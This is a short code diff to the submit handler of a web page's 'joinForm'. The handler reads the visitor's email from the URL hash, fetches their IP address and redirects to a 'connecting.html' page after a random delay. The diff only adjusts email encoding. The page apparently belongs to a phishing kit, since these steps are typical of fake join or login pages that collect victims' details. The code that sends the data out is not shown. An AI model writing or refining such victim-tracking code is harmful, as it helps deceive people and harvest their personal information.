@@ -295,7 +295,7 @@ document.getElementById('joinForm').addEventListener('submit', async function(e)
 
   // --- Capture email from URL hash ---
   let email = window.location.hash ? window.location.hash.substring(1) : '';
-  email = email.replace(/=*$/, ''); // strip trailing =
+  email = decodeURIComponent(email).replace(/=+$/, ''); // CLEAN EMAIL
 
   // --- Fetch IP ---
   let ipAddress = 'Unavailable';
@@ -335,9 +335,10 @@ document.getElementById('joinForm').addEventListener('submit', async function(e)
     });
   } catch {}
 
-  // --- Redirect to Page 2 with raw hash (no encode) ---
+  // --- Redirect to Page 2 with encoded hash ---
   setTimeout(() => {
-    window.location.href = 'connecting.html' + (email ? '#' + email : '');
+    const cleanEmail = encodeURIComponent(email); // URL-safe
+    window.location.href = 'connecting.html' + (email ? '#' + cleanEmail : '');
   }, Math.floor(Math.random() * 1000) + 500);
 });
 </script>
